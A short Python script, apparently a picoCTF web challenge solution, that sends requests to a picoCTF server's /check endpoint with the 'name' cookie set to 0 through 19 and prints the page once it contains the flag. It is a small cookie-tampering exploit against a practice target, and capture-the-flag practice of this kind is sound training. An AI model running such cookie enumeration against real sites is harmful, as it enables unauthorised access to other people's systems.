import requests

url = "http://mercury.picoctf.net:64944/check"

for i in range(20):
    cookies = {
        "name": str(i)
    }
    r = requests.get(url, cookies=cookies)
    if "pico" in r.text:
        print(r.text)
        break


    